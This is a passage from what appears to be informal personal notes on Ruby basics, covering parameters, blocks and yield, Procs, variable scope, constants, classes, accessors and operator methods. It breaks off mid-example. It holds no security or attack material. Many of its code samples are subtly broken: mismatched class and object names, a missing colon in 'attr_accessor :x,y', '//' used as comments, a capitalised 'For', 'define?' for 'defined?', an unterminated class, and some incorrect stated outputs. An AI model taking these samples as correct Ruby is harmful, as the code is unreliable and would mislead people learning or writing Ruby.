<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fibonacci</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">fibonacci</span> <span class="mi">5</span>
<span class="c1"># both are correct</span>
</code></pre></div></div>

<h3 id="alias">Alias</h3>

<ul>
  <li>Ruby allows one to define aliases For methods</li>
  <li>This is helpful if u wanna to have a method with a more natural or expressive name</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">method_in_ruby</span>
  <span class="nb">puts</span> <span class="s2">"whatever"</span>
<span class="k">end</span>
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">alias</span> <span class="n">mir</span> <span class="n">method_in_ruby</span>

<span class="n">mir</span>
<span class="c1"># Output: "whatever"</span>
</code></pre></div></div>

<blockquote>
  <p>Aliases are commonly used as a backup in order to extend the ability or functionality of a method</p>
</blockquote>

<h3 id="parameters-default-values">Parameters Default Values</h3>
<p>U can specify default values For parameters of your methods. These values will be assigned when an actual parameter will be omitted.</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">def</span> <span class="nf">print_name</span><span class="p">(</span><span class="nb">name</span> <span class="o">=</span> <span class="s2">"unknown"</span><span class="p">)</span>
	<span class="nb">print</span> <span class="s2">"</span><span class="se">\s</span><span class="s2">"</span><span class="p">,</span><span class="nb">name</span><span class="p">,</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span>
<span class="k">end</span>

<span class="n">print_name</span> <span class="s2">"john"</span>
<span class="c1"># Output: john</span>
<span class="n">print_name</span> <span class="c1"># &lt;anything as parameter&gt;</span>
<span class="c1"># Output: unknown # &lt;the method grab the default value&gt;</span>
</code></pre></div></div>

<h3 id="variable-length-arguments">Variable Length Arguments</h3>
<ul>
  <li>U can create a method that is able to handle variable length arguments as parameters</li>
  <li>U have to add an * before one (and only one) of the parameters of your method</li>
  <li>Then u can call the method with whatever arguments u want</li>
  <li>The parameter with * captures them as an array</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">method</span> <span class="p">(</span><span class="n">first</span><span class="p">,</span> <span class="o">*</span><span class="n">others</span><span class="p">)</span>
  <span class="nb">puts</span> <span class="s2">"first is: "</span><span class="o">+</span><span class="n">first</span><span class="p">.</span><span class="nf">to_s</span>
  <span class="nb">print</span> <span class="s2">"others: "</span><span class="o">+</span><span class="n">others</span><span class="p">.</span><span class="nf">to_s</span>
<span class="k">end</span>

<span class="nb">method</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
  <span class="ss">first: </span><span class="mi">1</span>
  <span class="ss">others: </span><span class="p">[</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span>
</code></pre></div></div>

<h3 id="hashes-as-arguments">Hashes as Arguments</h3>
<ul>
  <li>with hashes, you can invoke a method specifying explicitly (at calling time) the name of arguments.</li>
  <li>Usually this style of programming is ideal when you have symbols such as hash key values. Therefore Ruby provides an elegant and useful syntax.</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">printPerson</span><span class="p">(</span><span class="nb">hash</span><span class="p">)</span>
  <span class="nb">name</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">[</span><span class="ss">:name</span><span class="p">]</span> <span class="o">||</span> <span class="s2">"Unkown"</span>
  <span class="n">age</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">[</span><span class="ss">:age</span><span class="p">]</span> <span class="o">||</span> <span class="s2">"Unkown"</span>
  <span class="n">gender</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">[</span><span class="ss">:gender</span><span class="p">]</span> <span class="o">||</span> <span class="s2">"Unkown"</span>
  <span class="nb">print</span> <span class="nb">name</span><span class="p">,</span> <span class="s2">"</span><span class="se">\s</span><span class="s2">"</span><span class="p">,</span><span class="n">age</span><span class="p">,</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span><span class="p">,</span><span class="n">gender</span>
<span class="k">end</span>

<span class="n">printPerson</span> <span class="nb">name</span><span class="ss">:"ana"</span><span class="p">,</span><span class="n">age</span><span class="p">:</span><span class="mi">27</span>
<span class="c1"># Output: Ana 27 Unknown</span>
</code></pre></div></div>

<h3 id="block-arguments">Block Arguments</h3>
<ul>
  <li>Inside the method, we can invoke the code in the block with the <strong>yield</strong> statement.</li>
  <li>Iterators do it For us silently</li>
  <li>Yield transfers the control flow to the block associated with the method invocation</li>
</ul>

<p>Example 1:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">method</span>
  <span class="nb">puts</span> <span class="s2">"inside method"</span>
  <span class="k">yield</span>
  <span class="nb">puts</span> <span class="s2">"Again inside method"</span>
  <span class="k">yield</span>
<span class="k">end</span>

<span class="nb">method</span> <span class="p">{</span><span class="nb">puts</span> <span class="s2">"In the BLOCK now"</span> <span class="p">}</span>
</code></pre></div></div>

<p>output:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">→</span> <span class="no">Inside</span> <span class="nb">method</span>
 <span class="err">→</span> <span class="no">In</span> <span class="n">the</span> <span class="no">BLOCK</span> <span class="n">now</span>
 <span class="err">→</span> <span class="no">Again</span> <span class="n">inside</span> <span class="nb">method</span>
 <span class="err">→</span> <span class="no">In</span> <span class="n">the</span> <span class="no">BLOCK</span> <span class="n">now</span>
</code></pre></div></div>

<ul>
  <li>You can pass arguments with yield and use them in the block</li>
</ul>

<p>Example 2:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">def</span> <span class="nf">double</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
  <span class="k">yield</span> <span class="mi">2</span><span class="o">*</span><span class="n">x</span>
<span class="k">end</span>

<span class="n">double</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="nb">print</span> <span class="n">x</span> <span class="p">}</span>
<span class="c1"># Output: 10=&gt;nil</span>
<span class="n">double</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">x</span> <span class="p">}</span>
<span class="c1"># Output: 10</span>
<span class="n">double</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">/</span><span class="sr">/ without block 
# Output: error
</span></code></pre></div></div>

<ul>
  <li>Yield is often used with iteration</li>
  <li>This example method generates all the even numbers that are less than n and the block prints them to stdout.</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">even</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
  <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">2</span><span class="o">..</span><span class="n">n</span>
    <span class="k">yield</span> <span class="n">i</span> <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span>
  <span class="k">end</span>
<span class="k">end</span>


<span class="n">even</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="p">{</span><span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="nb">print</span> <span class="n">x</span><span class="p">,</span> <span class="s2">"</span><span class="se">\s</span><span class="s2">"</span><span class="p">}</span>
  <span class="mi">2</span> <span class="mi">4</span> <span class="mi">6</span> <span class="mi">8</span> <span class="mi">10</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="o">..</span><span class="mi">10</span>
</code></pre></div></div>

<ul>
  <li>if u do not want to use yield, Ruby allows you to pass a block as an argument. With this strategy, the block becomes an instance of the Proc class and u have to use call instead of yield to transfer the control to it.</li>
  <li>To specify that an argument will be a Proc object that encapsulates a block you must use the ampersand (&amp;) in method definition.</li>
</ul>

<p>Example 1:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">square_cube</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="o">&amp;</span><span class="nb">p</span><span class="p">)</span>
  <span class="no">For</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">1</span><span class="o">..</span><span class="n">n</span>
	  <span class="nb">p</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="n">i</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># or yield i**2</span>
	  <span class="nb">p</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="n">i</span><span class="o">**</span><span class="mi">3</span><span class="p">)</span> <span class="c1"># or yield i**3</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="n">square_cube</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="p">{</span><span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="nb">print</span> <span class="n">x</span><span class="p">,</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span><span class="p">}</span>
	<span class="mi">1</span> <span class="mi">1</span> <span class="mi">4</span> <span class="mi">8</span> <span class="mi">9</span> <span class="mi">27</span> <span class="mi">16</span> <span class="mi">64</span> <span class="mi">25</span> <span class="mi">125</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="o">..</span><span class="mi">5</span>
</code></pre></div></div>

<ul>
  <li>Proc object as normal argument values</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">square</span> <span class="o">=</span> <span class="no">Proc</span><span class="p">.</span><span class="nf">new</span> <span class="p">{</span><span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="nb">print</span> <span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="p">,</span><span class="s2">"</span><span class="se">\s</span><span class="s2">"</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">print_proc</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">pr</span><span class="p">)</span>
  <span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="mi">1</span><span class="o">..</span><span class="n">n</span>
	  <span class="n">pr</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="n">print_proc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">square</span><span class="p">)</span>
<span class="c1"># Output: 1 4 9 16 25 36 49 64 =&gt; 1..8</span>
</code></pre></div></div>

<h3 id="bang-methods">Bang methods</h3>
<ul>
  <li>They are methods that end with an exclamation mark <strong>!</strong></li>
  <li>They modify the object that is called.</li>
  <li>Usually common bang methods are related to Array or Hash.</li>
</ul>

<h3 id="returned-values">Returned Values</h3>
<p>If we return more than one value, its converted to an array automatically:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">ret_value</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span>
<span class="k">end</span>
<span class="n">array</span> <span class="o">=</span> <span class="n">ret_value</span>
	<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span>
<span class="n">array</span>
	<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">]</span>

</code></pre></div></div>

<h2 id="variables--scope">Variables &amp; Scope</h2>

<ul>
  <li>Ruby is dynamically typed language: u can create a variable without specifying its type.</li>
  <li>It infers the type from the type of object u assign to it</li>
  <li>u can change the type of variable by changing its referenced object type</li>
</ul>

<p>There is 4 types of variables in Ruby:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ss">local: </span><span class="n">visible</span> <span class="n">within</span> <span class="n">a</span> <span class="nb">method</span> <span class="ow">or</span> <span class="n">block</span>
<span class="ss">global: </span><span class="n">visible</span> <span class="n">throughout</span> <span class="n">a</span> <span class="no">Ruby</span> <span class="n">program</span>
<span class="ss">instance: </span><span class="n">visible</span> <span class="n">within</span> <span class="n">an</span> <span class="n">object</span> <span class="n">instance</span>
<span class="ss">class: </span><span class="n">visible</span> <span class="n">within</span> <span class="n">all</span> <span class="k">class</span> <span class="n">instances</span>
</code></pre></div></div>

<h3 id="local-variables">Local variables</h3>
<ul>
  <li>begin with a lowercase letter or an underscore <strong>_</strong></li>
  <li>they are visible within a specific local area of the Ruby source code (method, class, module).</li>
  <li>Statements like For, While, iF, etc.. do not define a new scope. Variables defined inside them are still accessible outside.</li>
</ul>

<p>→ kernel statements - http://ruby-doc.org/core-1.9.3/Kernel.html</p>

<ul>
  <li>define new scope</li>
</ul>

<p>Example: loop</p>

<p>The following control structures define a new scope:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="o">...</span> <span class="k">end</span>
<span class="k">class</span> <span class="o">...</span> <span class="k">end</span>
<span class="n">module</span> <span class="o">...</span> <span class="k">end</span>
<span class="kp">loop</span> <span class="p">{</span> <span class="o">...</span> <span class="p">}</span>
<span class="nb">proc</span> <span class="p">{</span> <span class="o">...</span> <span class="p">}</span>
<span class="n">iterators</span><span class="o">/</span><span class="nb">method</span> <span class="n">blocks</span>
<span class="n">the</span> <span class="n">entire</span> <span class="n">script</span>
</code></pre></div></div>

<blockquote>
  <p>u can verify the scope of a variable by using the <strong>define?</strong> method</p>
</blockquote>

<h3 id="global-variables">Global variables</h3>
<ul>
  <li>begins with the <strong>$</strong> special character. It has a global scope, meaning that it can be visible and accesible. anywhere in the program.</li>
</ul>

<p>Some pre-defined global variables. Some examples:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="vg">$*</span> <span class="p">:</span> <span class="n">array</span> <span class="n">of</span> <span class="n">command</span> <span class="n">line</span> <span class="n">arguments</span>
<span class="vg">$0</span> <span class="p">:</span> <span class="nb">name</span> <span class="n">of</span> <span class="n">the</span> <span class="n">script</span> <span class="n">being</span> <span class="n">executed</span>
<span class="vg">$_</span> <span class="p">:</span> <span class="n">last</span> <span class="n">string</span> <span class="n">read</span> <span class="n">by</span> <span class="nb">gets</span>
 <span class="err">→</span> <span class="ss">moreover: </span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">ruby</span><span class="o">-</span><span class="n">doc</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">core</span><span class="o">-</span><span class="mf">2.0</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">globals_rdoc</span><span class="p">.</span><span class="nf">html</span>
</code></pre></div></div>

<p>Example: reads a line and prints it:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">print</span> <span class="s2">"write something: </span><span class="se">\t</span><span class="s2">"</span>
<span class="vg">$stdin</span><span class="p">.</span><span class="nf">gets</span>
<span class="nb">print</span> <span class="s2">"gets: </span><span class="se">\t\t\t</span><span class="s2">"</span><span class="p">,</span><span class="vg">$_</span>
<span class="nb">puts</span>
</code></pre></div></div>

<h3 id="instance--class-variables">Instance &amp; Class Variables</h3>
<ul>
  <li>class variables begin with @@ and they are visible by all instances of a class</li>
  <li>instances variables begins with @. They are local to specific instances of a class</li>
</ul>

<h3 id="constants">Constants</h3>
<ul>
  <li>Begins with an uppercase. THey should not be changed after their initialization</li>
  <li>However Ruby allows u to change them but with a warning</li>
  <li>Belongs to the scope</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">A</span> <span class="o">=</span> <span class="mi">100</span>
<span class="k">module</span> <span class="nn">B</span>
  <span class="no">A</span> <span class="o">=</span> <span class="mi">200</span>
<span class="k">end</span>

<span class="no">A</span>
<span class="c1"># Output: 100</span>
<span class="no">B</span><span class="o">::</span><span class="no">A</span>
<span class="c1"># Output: 200</span>
<span class="sr">//</span> <span class="n">we</span> <span class="n">can</span> <span class="n">access</span> <span class="n">the</span> <span class="n">constant</span> <span class="n">of</span> <span class="n">the</span> <span class="k">module</span> <span class="nn">by</span> <span class="n">using</span> <span class="n">its</span> <span class="n">namespace</span> <span class="no">B</span><span class="o">::</span><span class="no">A</span>
</code></pre></div></div>

<p>Another global examples:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">ARGV</span> <span class="p">:</span> <span class="n">holds</span> <span class="n">command</span> <span class="n">line</span> <span class="n">arguments</span>
<span class="no">ENV</span> <span class="p">:</span> <span class="n">holds</span> <span class="n">information</span> <span class="n">about</span> <span class="n">environment</span>
<span class="sr">//</span> <span class="ss">moreover: </span><span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">ruby</span><span class="o">-</span><span class="n">doc</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">core</span><span class="o">-</span><span class="mf">2.0</span><span class="o">/</span><span class="n">doc</span><span class="o">/</span><span class="n">globals_rdoc</span><span class="p">.</span><span class="nf">html</span>
</code></pre></div></div>

<h3 id="tricks">tricks</h3>
<p>We can declare multiple variables:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="err">→</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span> <span class="o">=</span> <span class="s2">"a"</span><span class="p">,</span><span class="s2">"b"</span><span class="p">,</span><span class="s2">"c"</span>
</code></pre></div></div>

<p>Swap two variables without using a temporary one:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">x</span><span class="o">=</span><span class="mi">10</span>
 <span class="n">y</span> <span class="o">=</span> <span class="mi">20</span>
<span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">=</span><span class="n">y</span><span class="p">,</span><span class="n">x</span>
</code></pre></div></div>

<h2 id="classes-principles">Classes Principles</h2>
<p>How to define a class:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="o">&lt;</span><span class="no">Name</span><span class="o">&gt;</span>
  <span class="o">...&lt;</span><span class="k">class</span> <span class="n">body</span><span class="o">&gt;...</span>
<span class="k">end</span>
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">&lt;</span><span class="no">Name</span><span class="o">&gt;</span> <span class="n">must</span> <span class="k">begin</span> <span class="n">with</span> <span class="n">a</span> <span class="n">capital</span> <span class="n">letter</span><span class="o">.</span> <span class="no">This</span> <span class="n">holds</span> <span class="n">because</span> <span class="no">Ruby</span> <span class="n">creates</span> <span class="n">the</span> <span class="n">constante</span> <span class="o">&lt;</span><span class="no">Name</span><span class="o">&gt;</span> <span class="n">to</span> <span class="n">refer</span> <span class="n">the</span> <span class="k">class</span><span class="p">,</span> <span class="n">so</span> <span class="n">the</span> <span class="n">capital</span> <span class="n">letter</span> <span class="n">is</span> <span class="n">required</span><span class="o">.</span>
</code></pre></div></div>

<p>Create a class:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Myclass</span>
  <span class="k">def</span> <span class="nf">hello</span>
	<span class="nb">print</span> <span class="s2">"Hello"</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="sr">//</span> <span class="n">instantiate</span> <span class="n">an</span> <span class="n">object</span>
<span class="no">MyObj</span> <span class="o">=</span> <span class="no">MyClass</span><span class="p">.</span><span class="nf">new</span>

<span class="sr">//</span> <span class="n">invoke</span> <span class="n">an</span> <span class="n">object</span> <span class="nb">method</span>
<span class="no">MyObject</span><span class="p">.</span><span class="nf">hello</span>
<span class="c1"># Output: Hello</span>
</code></pre></div></div>

<p>→  moreover: http://ruby-doc.org/core-1.9.3/Class.html</p>

<h3 id="instance-variables">Instance Variables</h3>
<ul>
  <li>are variables available only to each instance of the class, meaning that they change from object to object.</li>
  <li>they are defined within class definition using the special character @</li>
  <li>instance variable are only accessible via the instances public methods. So you have to define accessors methods to read them and setters methods to set them.</li>
</ul>

<p>To inialize them, the default constructor method in Ruby is <strong>initialize</strong></p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">class</span> <span class="nc">MyClass</span>
  <span class="c1">#constructor method</span>
  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
	  <span class="vi">@a</span> <span class="o">=</span> <span class="n">a</span>
  <span class="k">end</span>
  <span class="c1"># setter method</span>
  <span class="k">def</span> <span class="nf">a</span><span class="o">=</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
	  <span class="vi">@a</span> <span class="o">=</span> <span class="n">value</span>
  <span class="k">end</span>
  <span class="c1"># getter method</span>
  <span class="k">def</span> <span class="nf">a</span>
	  <span class="vi">@a</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<p>// All instances of MyClass have their own instance variable (@a) which is accessible thanks to the getter and the setter method ‘a’.</p>

<ul>
  <li>instances variables are resolved in the context of <strong>self</strong>. When we invoke a method, self refers to an instance of a Class. Otherwise inside a Class but ouside any method, self is the object that represents the class,</li>
</ul>

<h3 id="getter--setter-through-metaprogramming">Getter / Setter through Metaprogramming</h3>
<ul>
  <li>with the <strong>attr_accessor</strong> keyword, Ruby silently defines a getter and a setter For us.</li>
  <li>it requires a symbol notation but it defines real instance variables @x, @y</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">QuickGS</span>
  <span class="nb">attr_accessor</span> <span class="ss">:x</span><span class="p">,</span><span class="n">y</span>
<span class="k">end</span>
<span class="n">obj</span> <span class="o">=</span> <span class="no">QuickGS</span><span class="p">.</span><span class="nf">new</span>

<span class="n">obj</span><span class="p">.</span><span class="nf">x</span><span class="p">,</span> <span class="n">obj</span><span class="p">.</span><span class="nf">y</span> <span class="o">=</span> <span class="mi">100</span><span class="p">,</span><span class="mi">300</span>
<span class="nb">print</span> <span class="n">obj</span><span class="p">.</span><span class="nf">x</span><span class="s2">" "</span> <span class="n">obj</span><span class="p">.</span><span class="nf">y</span>
<span class="c1"># Output: 100 300</span>
</code></pre></div></div>

<blockquote>
  <p>with the <strong>attr_reader</strong> keyword, Ruby silently difines a getter.</p>
</blockquote>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">QuickG</span>
  <span class="nb">attr_reader</span> <span class="ss">:x</span><span class="p">,</span><span class="n">y</span>
  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
	<span class="vi">@x</span><span class="p">,</span><span class="vi">@y</span> <span class="o">=</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span>
  <span class="k">end</span>
<span class="k">end</span>
<span class="n">obj</span> <span class="o">=</span> <span class="no">QuickG</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">20</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>we can print, but we cant set</li>
  <li>
    <p>because the setter has not been defined</p>
  </li>
  <li><strong>Attr</strong> is another useful keyword</li>
</ul>

<p>If used alone, it defines a getter while with true it defines a setter too:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">QuickGS</span>
  <span class="kp">attr</span> <span class="ss">:x</span><span class="p">,</span><span class="kp">true</span>
  <span class="kp">attr</span> <span class="ss">:y</span>
  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
	<span class="vi">@x</span><span class="p">,</span><span class="vi">@y</span> <span class="o">=</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span>
  <span class="k">end</span>
<span class="k">end</span>
<span class="n">obj</span> <span class="o">=</span> <span class="no">QuickGS</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">20</span><span class="p">)</span>

<span class="n">obj</span><span class="p">.</span><span class="nf">x</span> <span class="o">=</span> <span class="mi">100</span>
<span class="c1"># Output: 100</span>
<span class="n">obj</span><span class="p">.</span><span class="nf">y</span> <span class="o">=</span> <span class="mi">200</span>
<span class="c1"># Output: error</span>
</code></pre></div></div>

<h3 id="class-methods">Class Methods</h3>
<p>Self refers the current object:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">C1</span>
  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">say</span>
	<span class="nb">print</span> <span class="s2">"hello"</span>
  <span class="k">end</span>
<span class="k">end</span>
<span class="n">c1</span><span class="p">.</span><span class="nf">say</span>
<span class="c1"># Output: hello</span>

</code></pre></div></div>

<ul>
  <li>Since a Class is an object, we can define Class object instance variables with getter and setter too.</li>
  <li>Class methods may be defined in a few other ways:</li>
</ul>

<p>→ Using the class name instead of <strong>self</strong> keyword</p>

<p>→ Using the <strong>«</strong> notation</p>

<blockquote>
  <p>the <strong>«</strong> notation is useful when u work with classes that have been already defined.</p>
</blockquote>

<h3 id="class-variables">Class Variables</h3>
<ul>
  <li>must start with @@ and its shared among all class instances</li>
</ul>

<h3 id="class-contants">Class Contants</h3>
<p>They are accessible from outside using <strong>::notation</strong></p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">MyClass</span>
  <span class="no">C1</span> <span class="o">=</span> <span class="s2">"hello"</span>
<span class="no">MyClass</span><span class="o">::</span><span class="no">C1</span>
<span class="c1"># Output: hello</span>
</code></pre></div></div>

<h3 id="open-classes">Open Classes</h3>
<ul>
  <li>Generally in conventional OO languages, when you close the class definition you cannot add anything else in it, unless you use some advanced technique and tools like reflection</li>
</ul>

<p>Ruby allows u to open a defined class in order to add other methods, constants, etc</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">String</span>
  <span class="k">def</span> <span class="nf">dsize</span>
	<span class="nb">self</span><span class="p">.</span><span class="nf">size</span> <span class="o">*</span> <span class="mi">2</span>
  <span class="k">end</span>
<span class="k">end</span>
<span class="s2">"Hello"</span><span class="p">.</span><span class="nf">size</span>
<span class="c1"># Output: 5</span>
<span class="s2">"Hello"</span><span class="p">.</span><span class="nf">dsize</span>
<span class="c1"># Output: 10</span>
<span class="sr">//</span> <span class="n">the</span> <span class="n">string</span> <span class="k">class</span> <span class="n">already</span> <span class="n">exists</span><span class="p">,</span> <span class="n">the</span> <span class="nb">method</span> <span class="n">dsize</span> <span class="n">is</span> <span class="n">added</span> <span class="n">to</span> <span class="n">it</span><span class="o">.</span>
</code></pre></div></div>

<h3 id="operator-methods">Operator Methods</h3>
<ul>
  <li>Point class represent a simple point in Euclidean geometry.</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p1</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="n">p2</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">20</span><span class="p">)</span>
<span class="n">p1</span> <span class="o">+</span> <span class="n">p2</span> <span class="o">=</span> <span class="n">p3</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mi">22</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>The sum of two points will return a new point that contains the sum of the coordinates x and y</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Point</span>
  <span class="kp">attr</span> <span class="ss">:x</span><span class="p">,</span><span class="ss">:y</span>
	
  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
    <span class="vi">@x</span><span class="p">,</span><span class="vi">@y</span><span class="o">=</span><span class="n">x</span><span class="p">,</span><span class="n">y</span>
  <span class="k">end</span>
  <span class="k">def</span> <span class="nf">+</span><span class="p">(</span><span class="n">other</span><span class="p">)</span>
    <span class="no">Point</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="vi">@x</span><span class="o">+</span><span class="n">other</span><span class="p">.</span><span class="nf">x</span><span class="p">,</span><span class="vi">@y</span> <span class="o">+</span> <span class="n">other</span><span class="p">.</span><span class="nf">y</span><span class="p">)</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<p>// two coordinates (x,y). each of them has a getter
// there is no setter or other method to change them</p>

<h3 id="mutable--immutable-values">Mutable / Immutable values</h3>
<ul>
  <li>In the previous Point example, we used Point as immutable values</li>
  <li>This new Point class creates a mutable object value. Each coordinate has its own setter</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Point</span>
  <span class="nb">attr_accessor</span> <span class="ss">:x</span><span class="p">,</span> <span class="ss">:y</span>
  
  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
